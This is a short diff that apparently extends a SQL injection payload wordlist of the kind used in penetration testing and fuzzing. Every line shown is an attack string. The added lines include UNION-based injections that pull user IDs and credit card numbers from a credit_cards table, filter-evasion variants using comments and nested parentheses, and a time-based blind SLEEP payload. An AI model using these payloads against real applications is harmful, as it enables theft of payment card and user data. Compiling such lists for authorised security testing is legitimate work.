@@ -77,3 +77,8 @@ TRUE DIV(SELECT ((ORD(LEFT
 1 GROUP BY 1 HAVING '1' = 1
 1 GROUP BY 1,TRANSID,ACCOUNTID HAVING 1=1
 1 AND SELECT TOP 10 USERNAME FROM USERS -- 1
+1001 union(select userid, ccnumber, '3', '4' from credit_cards)
+1001 union((select userid, ccnumber, '3', '4' from credit_cards))
+1001 union/*/**/*/select userid, ccnumber, '3', '4' from credit_cards
+1001 or 'A' = 'B' union select userid, ccnumber, '3', '4' from credit_cards
+'6334588?'||SLEEP(3)&&'1
